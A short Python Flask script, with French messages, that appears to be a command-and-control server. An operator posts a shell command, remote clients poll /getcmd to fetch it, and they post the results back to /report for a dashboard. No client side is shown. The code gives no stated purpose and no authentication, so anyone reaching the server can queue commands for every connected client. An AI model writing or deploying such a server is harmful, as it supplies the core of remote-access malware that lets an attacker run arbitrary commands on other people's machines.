from flask import Flask, request, render_template

app = Flask(__name__)
latest_output = ""

@app.route("/")
def dashboard():
    return render_template("index.html", output=latest_output)

@app.route("/cmd", methods=["POST"])
def receive_cmd():
    cmd = request.form["command"]
    with open("command.txt", "w") as f:
        f.write(cmd)
    return "Commande envoyée"

@app.route("/getcmd")
def get_cmd():
    try:
        with open("command.txt") as f:
            return f.read()
    except FileNotFoundError:
        return ""

@app.route("/report", methods=["POST"])
def receive_output():
    global latest_output
    latest_output = request.data.decode()
    return "Résultat reçu"
